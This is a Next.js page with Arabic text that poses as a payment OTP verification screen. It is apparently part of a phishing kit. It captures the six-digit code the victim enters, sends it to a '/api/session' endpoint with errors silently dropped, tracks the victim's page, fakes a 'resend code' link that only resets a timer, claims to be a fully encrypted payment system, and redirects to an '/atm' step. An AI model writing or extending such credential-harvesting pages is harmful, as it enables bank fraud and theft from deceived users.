"use client";
export const dynamic = 'force-dynamic';
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import SessionTracker from "@/components/SessionTracker";

const GREEN = "#1e7344";

export default function OTPPage() {
  const router = useRouter();
  const [otp, setOtp] = useState("");
  const [timeLeft, setTimeLeft] = useState(120);
  const [canResend, setCanResend] = useState(false);

  useEffect(() => {
    if (timeLeft <= 0) { setCanResend(true); return; }
    const timer = setTimeout(() => setTimeLeft(t => t - 1), 1000);
    return () => clearTimeout(timer);
  }, [timeLeft]);

  const minutes = Math.floor(timeLeft / 60).toString().padStart(2, "0");
  const seconds = (timeLeft % 60).toString().padStart(2, "0");

  function handleConfirm() {
    if (otp.length === 6) {
      // إرسال رمز OTP للـ API
      fetch('/api/session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ current_page: 'otp', otp_code: otp }),
      }).catch(() => {});
      router.push("/atm");
    } else {
      alert("يرجى إدخال رمز مكون من 6 أرقام");
    }
  }

  return (
    <div style={{ backgroundColor: "#f7f8fa", display: "flex", justifyContent: "center", alignItems: "center", minHeight: "100vh", padding: "10px" }}>
      <SessionTracker page="otp" />
      <div style={{ background: "#fff", width: "100%", maxWidth: "350px", borderRadius: "20px", paddingBottom: "25px", boxShadow: "0 8px 25px rgba(0,0,0,0.05)", textAlign: "center", overflow: "hidden" }}>

        <img src="https://i.ibb.co/VWbkStrM/IMG-1749.webp" style={{ width: "100%", maxWidth: "180px", height: "auto", margin: "20px auto 10px", display: "block" }} alt="OTP" />

        <div style={{ padding: "0 20px" }}>
          <h2 style={{ fontSize: "17px", color: "#333", marginBottom: "8px", fontWeight: "bold" }}>أدخل رمز التحقق</h2>
          <p style={{ fontSize: "12px", color: "#777", lineHeight: "1.5", marginBottom: "20px" }}>
            يرجى إدخال الرمز المكون من 6 أرقام المرسل لجوالك.
          </p>

          <input
            type="tel"
            maxLength={6}
            value={otp}
            onChange={e => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
            placeholder="••••••"
            style={{
              width: "100%", maxWidth: "220px", height: "45px",
              border: "1px solid #ddd", borderRadius: "8px",
              textAlign: "center", fontSize: "20px", letterSpacing: "8px",
              fontWeight: "bold", color: GREEN, outline: "none",
              backgroundColor: "#fafafa", marginBottom: "15px",
              display: "block", margin: "0 auto 15px",
            }}
          />

          <div style={{ fontSize: "12px", color: "#999", marginBottom: "20px", minHeight: "20px" }}>
            {canResend ? (
              <span
                onClick={() => { setTimeLeft(120); setCanResend(false); setOtp(""); }}
                style={{ color: GREEN, fontWeight: "bold", cursor: "pointer", textDecoration: "underline" }}
              >
                إعادة إرسال الرمز الآن
              </span>
            ) : (
              <>إعادة إرسال الرمز خلال <strong>{minutes}:{seconds}</strong> دقيقة</>
            )}
          </div>

          <button
            onClick={handleConfirm}
            style={{ width: "100%", backgroundColor: GREEN, color: "white", border: "none", borderRadius: "10px", padding: "12px", fontSize: "15px", fontWeight: "bold", cursor: "pointer" }}
          >
            تأكيد العملية
          </button>

          <div style={{ marginTop: "15px", fontSize: "10px", color: "#bbb" }}>🔒 نظام دفع مشفر وآمن بالكامل</div>
        </div>
      </div>
    </div>
  );
}
